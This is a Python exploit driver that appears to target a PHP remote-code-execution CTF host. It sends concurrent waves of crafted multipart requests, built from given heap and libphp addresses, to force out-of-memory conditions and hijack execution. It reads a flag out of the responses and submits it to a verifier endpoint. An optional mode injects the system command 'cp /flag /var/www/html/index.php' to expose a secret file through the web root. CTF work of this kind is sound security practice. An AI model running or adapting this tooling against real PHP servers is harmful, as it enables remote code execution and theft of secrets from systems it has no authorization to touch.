#!/usr/bin/env python3
"""One bounded complete-request A/B/S/D wave for the authorized Cloudflare CTF."""

from __future__ import annotations

import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
import json
import os
from pathlib import Path
import re
import secrets
import socket
import ssl
import sys
import time


sys.path.insert(0, "/root/bridge/stock")
import bridge_single_conn as single
import d_calibrate_live as base
import poison_seed_fire_lab as terminal
import stock_bin64_retained_flush_lab as stock


HOST = "php-rce.cloudflare.app"
PORT = 443
PATH = "/php/index.php"
VERIFY_PATH = "/api/verify"
BLOCK = 0x59400
S_HEADERS = 600_000
D_HEADERS = 402_500
EXPLOIT_ID_RE = re.compile(
    r"(?i)^[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}$"
)


def attempt_id(raw: bytes) -> str:
    match = re.search(rb"(?i)x-attempt-id:\s*([^\r\n]+)", raw)
    return match.group(1).decode("latin1", "replace").strip() if match else ""


def bound_flag(raw: bytes, marker: bytes) -> str | None:
    """Accept a flag only when it immediately follows this run's exact marker."""
    entity = base.response_entity(raw)
    marker_offset = entity.find(marker)
    if marker_offset < 0:
        return None
    tail = entity[marker_offset + len(marker) :]
    match = base.BRACED_FLAG_RE.match(tail) or base.UUID_RE.match(tail)
    return match.group(0).decode("ascii") if match else None


def send_one(label: str, index: int, body: bytes, boundary: bytes, marker: bytes, timeout: float):
    began = time.monotonic()
    try:
        raw = base.send(
            body,
            boundary,
            timeout,
            False,
            host=HOST,
            port=PORT,
            path=PATH,
            tls=True,
        )
        record = base.classify(raw, marker)
        record["flag"] = bound_flag(raw, marker)
        record["error"] = None
    except Exception as error:
        raw = b""
        record = {
            "status": 0,
            "oom": False,
            "oom_tried_bytes": None,
            "early_canary": False,
            "marker": False,
            "flag": None,
            "response_bytes": 0,
            "response_sha256": hashlib.sha256(b"").hexdigest(),
            "error": f"{type(error).__name__}: {error}",
        }
    record["label"] = label
    record["index"] = index
    record["attempt_id"] = attempt_id(raw)
    record["elapsed_s"] = round(time.monotonic() - began, 3)
    return record, raw


def run_wave(
    label: str,
    count: int,
    body: bytes,
    boundary: bytes,
    marker: bytes,
    timeout: float,
    out_dir: Path,
    on_result=None,
):
    results = []
    with ThreadPoolExecutor(max_workers=count) as executor:
        futures = [
            executor.submit(send_one, label, index, body, boundary, marker, timeout)
            for index in range(count)
        ]
        for future in as_completed(futures):
            record, raw = future.result()
            results.append(record)
            base.write_exclusive(
                out_dir / f"{label}-{record['index']:03d}.raw",
                raw,
            )
            if on_result is not None:
                on_result(record, raw)
    results.sort(key=lambda item: int(item["index"]))
    return results


def summarize(rows):
    return {
        "requests": len(rows),
        "status_200": sum(row.get("status") == 200 for row in rows),
        "status_500": sum(row.get("status") == 500 for row in rows),
        "status_0": sum(row.get("status") == 0 for row in rows),
        "oom": sum(bool(row.get("oom")) for row in rows),
        "oom_4096": sum(row.get("oom_tried_bytes") == 4096 for row in rows),
        "oom_81920": sum(row.get("oom_tried_bytes") == 81920 for row in rows),
        "early_canary": sum(bool(row.get("early_canary")) for row in rows),
        "marker": sum(bool(row.get("marker")) for row in rows),
        "flag": sum(bool(row.get("flag")) for row in rows),
        "errors": sum(bool(row.get("error")) for row in rows),
    }


def verify_flag(attempt: str, flag: str, timeout: float):
    payload = json.dumps(
        {"attemptId": attempt, "flag": flag}, separators=(",", ":")
    ).encode("utf-8")
    sock = socket.create_connection((HOST, PORT), timeout=timeout)
    sock = ssl.create_default_context().wrap_socket(sock, server_hostname=HOST)
    sock.settimeout(timeout)
    request = (
        b"POST " + VERIFY_PATH.encode("ascii") + b" HTTP/1.1\r\n"
        b"Host: " + HOST.encode("ascii") + b"\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: " + str(len(payload)).encode("ascii") + b"\r\n"
        b"Connection: close\r\n\r\n" + payload
    )
    response = bytearray()
    try:
        sock.sendall(request)
        while len(response) < 1 << 20:
            piece = sock.recv(65_536)
            if not piece:
                break
            response.extend(piece)
    finally:
        sock.close()
    raw = bytes(response)
    entity = base.response_entity(raw)
    status_match = re.match(rb"HTTP/1\.[01] (\d{3})", raw)
    try:
        document = json.loads(entity.decode("utf-8"))
    except Exception:
        document = {}
    status = int(status_match.group(1)) if status_match else 0
    exploit_id = document.get("exploitId") if isinstance(document, dict) else None
    if not isinstance(exploit_id, str) or not EXPLOIT_ID_RE.fullmatch(exploit_id):
        exploit_id = None
    permalink = document.get("permalink") if isinstance(document, dict) else None
    if not isinstance(permalink, str) or not permalink:
        permalink = (
            f"https://{HOST}/exploits/{exploit_id}" if exploit_id is not None else None
        )
    return {
        "status": status,
        "verified": status == 200 and isinstance(document, dict) and document.get("verified") is True,
        "exploit_id": exploit_id,
        "permalink": permalink,
        "response_sha256": hashlib.sha256(raw).hexdigest(),
        "body": entity.decode("utf-8", "replace")[:1000],
    }, raw


def fetch_path(path: str, timeout: float):
    sock = socket.create_connection((HOST, PORT), timeout=timeout)
    sock = ssl.create_default_context().wrap_socket(sock, server_hostname=HOST)
    sock.settimeout(timeout)
    request = (
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
        b"Host: " + HOST.encode("ascii") + b"\r\n"
        b"Content-Length: 0\r\n"
        b"Connection: close\r\n\r\n"
    )
    response = bytearray()
    try:
        sock.sendall(request)
        while len(response) < 1 << 20:
            piece = sock.recv(65_536)
            if not piece:
                break
            response.extend(piece)
    finally:
        sock.close()
    raw = bytes(response)
    entity = base.response_entity(raw)
    status_match = re.match(rb"HTTP/1\.[01] (\d{3})", raw)
    flag_match = base.BRACED_FLAG_RE.search(entity) or base.UUID_RE.search(entity)
    return {
        "path": path,
        "status": int(status_match.group(1)) if status_match else 0,
        "attempt_id": attempt_id(raw),
        "flag": flag_match.group(0).decode("ascii") if flag_match else None,
        "entity_bytes": len(entity),
        "entity_sha256": hashlib.sha256(entity).hexdigest(),
        "preview": entity[:500].decode("latin1", "replace"),
    }, raw


def write_receipt(path: Path, document: dict) -> None:
    base.write_exclusive(
        path,
        (json.dumps(document, indent=2, sort_keys=True) + "\n").encode("utf-8"),
    )


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--authorized-live", action="store_true")
    parser.add_argument("--arms", type=int, default=80)
    parser.add_argument("--b-count", type=int, default=25)
    parser.add_argument("--s-count", type=int, default=25)
    parser.add_argument("--d-count", type=int, default=25)
    parser.add_argument("--heap", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--libphp", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--block", type=lambda value: int(value, 0), default=BLOCK)
    parser.add_argument(
        "--profile",
        choices=("official-docker", "stock-twin"),
        default="official-docker",
    )
    parser.add_argument(
        "--terminal-mode",
        choices=("derived-adjacent", "system-copy"),
        default="derived-adjacent",
    )
    parser.add_argument("--timeout", type=float, default=75.0)
    parser.add_argument("--out-dir", required=True, type=Path)
    args = parser.parse_args()
    if not args.authorized_live:
        parser.error("the exact public CTF requires --authorized-live")
    for name in ("heap", "libphp"):
        value = int(getattr(args, name))
        if not 0x700000000000 <= value < 0x800000000000 or value & 0x1FFFFF:
            parser.error(f"--{name} must be a canonical 2 MiB-aligned address")
    if args.terminal_mode != "derived-adjacent":
        parser.error(
            "live verification requires the response-local derived-adjacent mode"
        )
    if args.out_dir.exists():
        parser.error("--out-dir must be new")
    args.out_dir.mkdir(mode=0o700)

    marker = ("SEEDFIRE-" + secrets.token_hex(3) + "|").encode("ascii")
    libphp = args.libphp
    profile = dict(terminal.PROFILES[args.profile])
    if args.profile == "stock-twin":
        profile.setdefault("zif_system", 0x598650)
    system_command = None
    if args.terminal_mode == "system-copy":
        system_command = b"cp /flag /var/www/html/index.php"
    a = base.add_preamble(single.arm_body())
    b = base.add_preamble(
        stock.finish_b_multipart(stock.build_b_fields(426_950, 21))
    )
    s = base.add_preamble(
        terminal.build_seed_body(
            args.heap,
            libphp,
            args.block,
            10,
            marker,
            seeds=1,
            oom_count=0,
            oom_depth=57,
            oom_headers=S_HEADERS,
            pressure_fields=45,
            probe=False,
            profile=profile,
            fd_mode=args.terminal_mode,
            system_command=system_command,
        )
    )
    d = base.add_preamble(base.build_fire_body(D_HEADERS))
    bodies = {
        "A": (a, single.ARM_BOUNDARY, args.arms),
        "B": (b, single.DISC_BOUNDARY, args.b_count),
        "S": (s, terminal.BOUNDARY, args.s_count),
        "D": (d, terminal.BOUNDARY, args.d_count),
    }
    receipt = {
        "schema": "cfctf/complete-request-wave/v1",
        "target": f"https://{HOST}{PATH}",
        "profile": args.profile,
        "heap": hex(args.heap),
        "libphp": hex(libphp),
        "libphp_minus_heap": hex(libphp - args.heap),
        "address_source": "explicit_strict_pair",
        "block": hex(args.block),
        "s_headers": S_HEADERS,
        "s_pressure_fields": 45,
        "d_headers": D_HEADERS,
        "terminal_mode": args.terminal_mode,
        "marker": marker.decode("ascii"),
        "wire": {
            label: {
                "bytes": len(body),
                "sha256": hashlib.sha256(body).hexdigest(),
                "count": count,
            }
            for label, (body, _boundary, count) in bodies.items()
        },
        "stages": {},
        "summary": {},
        "verifier": None,
        "verification_attempts": [],
        "readbacks": [],
        "verdict": "NOT_RUN",
    }

    def inspect_d_result(record: dict, raw: bytes) -> None:
        if receipt["verification_attempts"]:
            return
        flag = bound_flag(raw, marker)
        local_attempt = attempt_id(raw)
        if not flag or not re.fullmatch(r"[0-9a-fA-F-]{36}", local_attempt):
            return
        verification, verify_raw = verify_flag(local_attempt, flag, args.timeout)
        verify_name = f"verify-{int(record['index']):03d}.raw"
        base.write_exclusive(args.out_dir / verify_name, verify_raw)
        attempt = {
            "d_index": record["index"],
            "attempt_id": local_attempt,
            "flag": flag,
            "raw_path": verify_name,
            **verification,
        }
        receipt["verification_attempts"].append(attempt)
        if verification["verified"] and receipt["verifier"] is None:
            receipt["verifier"] = verification
            receipt["winning_response"] = record
            receipt["verdict"] = "VERIFIER_ACCEPTED"

    for label in ("A", "B", "S", "D"):
        body, boundary, count = bodies[label]
        rows = run_wave(
            label,
            count,
            body,
            boundary,
            marker,
            args.timeout,
            args.out_dir,
            inspect_d_result if label == "D" else None,
        )
        receipt["stages"][label] = rows
        receipt["summary"][label] = summarize(rows)
        print(label, json.dumps(receipt["summary"][label], sort_keys=True), flush=True)
        write_receipt(args.out_dir / f"checkpoint-{label}.json", receipt)
        if any(row.get("status") in {429, 503} for row in rows):
            receipt["verdict"] = "BACKOFF"
            break
        if label == "A" and receipt["summary"][label]["oom"] == 0:
            receipt["verdict"] = "A_WAVE_MISS"
            break
        if label == "B" and receipt["summary"][label]["oom_4096"] == 0:
            receipt["verdict"] = "B_WAVE_MISS"
            break
        if label == "S" and receipt["summary"][label]["oom_4096"] == 0:
            receipt["verdict"] = "S_WAVE_MISS"
            break
        if label == "D":
            hits = [row for row in rows if row.get("early_canary") or row.get("marker")]
            flag_hits = [row for row in hits if row.get("flag")]
            if receipt["verdict"] == "VERIFIER_ACCEPTED":
                pass
            elif flag_hits:
                receipt["winning_response"] = flag_hits[0]
                receipt["verdict"] = "FLAG_NOT_VERIFIED"
            elif hits:
                receipt["winning_response"] = hits[0]
                receipt["verdict"] = "PIVOT_WRITE_OBSERVED"
            else:
                receipt["verdict"] = "NO_PIVOT_IN_WAVE"

            if args.terminal_mode == "system-copy" and receipt["verdict"] != "VERIFIER_ACCEPTED":
                for read_index, read_path in enumerate(("/php/index.php",)):
                    readback, read_raw = fetch_path(read_path, args.timeout)
                    read_name = f"readback-{read_index}.raw"
                    base.write_exclusive(args.out_dir / read_name, read_raw)
                    readback["raw_path"] = read_name
                    receipt["readbacks"].append(readback)
                    flag = readback.get("flag")
                    local_attempt = str(readback.get("attempt_id") or "")
                    if not flag or not re.fullmatch(r"[0-9a-fA-F-]{36}", local_attempt):
                        continue
                    verification, verify_raw = verify_flag(local_attempt, str(flag), args.timeout)
                    verify_name = f"verify-readback-{read_index}.raw"
                    base.write_exclusive(args.out_dir / verify_name, verify_raw)
                    attempt = {
                        "readback_index": read_index,
                        "attempt_id": local_attempt,
                        "flag": flag,
                        "raw_path": verify_name,
                        **verification,
                    }
                    receipt["verification_attempts"].append(attempt)
                    if verification["verified"]:
                        receipt["verifier"] = verification
                        receipt["winning_response"] = readback
                        receipt["verdict"] = "VERIFIER_ACCEPTED"
                        break

    write_receipt(args.out_dir / "receipt.json", receipt)
    winning = receipt.get("winning_response") or {}
    print(json.dumps({
        "verdict": receipt["verdict"],
        "summary": receipt["summary"],
        "verifier": receipt["verifier"],
        "winning_response": {
            "present": bool(winning),
            "label": winning.get("label"),
            "index": winning.get("index"),
            "attempt_id": winning.get("attempt_id"),
            "flag_captured": bool(winning.get("flag")),
        },
        "out": str(args.out_dir),
    }, indent=2, sort_keys=True))
    return 0 if receipt["verdict"] == "VERIFIER_ACCEPTED" else 2


if __name__ == "__main__":
    raise SystemExit(main())
